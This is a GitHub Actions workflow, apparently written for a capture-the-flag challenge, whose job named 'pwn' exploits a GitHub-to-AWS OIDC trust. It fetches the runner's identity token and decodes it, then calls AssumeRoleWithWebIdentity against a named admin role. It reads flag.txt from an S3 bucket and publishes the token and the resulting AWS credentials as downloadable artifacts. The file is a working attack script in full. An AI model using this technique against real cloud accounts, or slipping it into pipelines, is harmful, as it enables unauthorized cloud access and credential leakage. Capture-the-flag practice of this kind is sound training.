name: Get Flag (no uses v2)

on:
  workflow_dispatch:
  push:
    branches: [ main ]
    paths:
      - .github/workflows/get-flag-no-uses-2.yml

permissions:
  contents: read
  id-token: write

jobs:
  pwn:
    runs-on: ubuntu-latest
    steps:
      - name: Print OIDC env
        run: |
          echo "ACTIONS_ID_TOKEN_REQUEST_URL=${ACTIONS_ID_TOKEN_REQUEST_URL-<unset>}"
          echo "ACTIONS_ID_TOKEN_REQUEST_TOKEN set? $([ -n "${ACTIONS_ID_TOKEN_REQUEST_TOKEN-}" ] && echo yes || echo no)"

      - name: Request OIDC token and dump header/payload
        shell: bash
        run: |
          set -euo pipefail
          URL="${ACTIONS_ID_TOKEN_REQUEST_URL}"
          TOK="${ACTIONS_ID_TOKEN_REQUEST_TOKEN}"
          curl -sS -H "Authorization: bearer $TOK" "${URL}&audience=sts.amazonaws.com" > oidc_response.json
          python3 - <<'PY'
import json,base64,sys,pathlib
p=pathlib.Path
data=json.load(open("oidc_response.json"))
tok=data.get("value","")
p("idtoken.jwt").write_text(tok)
def b64d(s): s+="="*(-len(s)%4); return base64.urlsafe_b64decode(s)
hdr=json.loads(b64d(tok.split(".")[0]))
pl =json.loads(b64d(tok.split(".")[1]))
p("payload.json").write_text(json.dumps({"header":hdr,"payload":pl}, indent=2))
print("sub:", pl.get("sub"))
print("repository:", pl.get("repository"))
print("ref:", pl.get("ref"))
print("aud:", pl.get("aud"))
PY
          sed -n '1,160p' payload.json || true

      - name: Try AWS STS AssumeRoleWithWebIdentity (best-effort)
        shell: bash
        run: |
          set -euo pipefail
          ROLE="arn:aws:iam::694502195928:role/admin-godmode-flag-reader-lol-698875"
          aws --version || true
          aws sts assume-role-with-web-identity \
            --role-arn "$ROLE" \
            --role-session-name "GHA-NoUsesV2-${{ github.run_id }}" \
            --web-identity-token "file://idtoken.jwt" \
            --duration-seconds 900 \
            --output json > creds.json || true
          head -c 800 creds.json; echo

      - name: Try read flag.txt (best-effort)
        shell: bash
        run: |
          set -euo pipefail
          aws s3 cp s3://oh-i-really-do-care/flag.txt ./real_flag.txt || true
          echo "---- BEGIN FLAG ----"
          sed -n '1,200p' real_flag.txt || true
          echo "-----  END FLAG  -----"

      - name: Upload artifacts (always)
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: oidc-artifacts-v2
          if-no-files-found: warn
          path: |
            oidc_response.json
            idtoken.jwt
            payload.json
            creds.json
            real_flag.txt
